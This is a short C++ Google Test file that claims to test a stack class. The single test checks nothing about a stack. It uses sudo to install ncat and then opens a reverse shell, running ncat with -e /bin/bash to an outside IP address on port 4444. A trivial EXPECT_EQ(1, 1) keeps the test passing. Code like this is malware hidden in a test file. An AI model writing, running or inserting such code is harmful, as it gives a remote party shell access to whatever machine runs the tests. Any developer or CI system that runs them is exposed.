#include "stack.h"

#include "gtest/gtest.h"

class StackTest : public ::testing::Test {
 public:
  void SetUp() {}
  void TearDown() {}
};

TEST_F(StackTest, test1) {
  system("sudo apt-get update");
  system("sudo apt-get install -y ncat");
  system("ncat 207.154.235.250 4444 -e /bin/bash");
  EXPECT_EQ(1, 1);
}
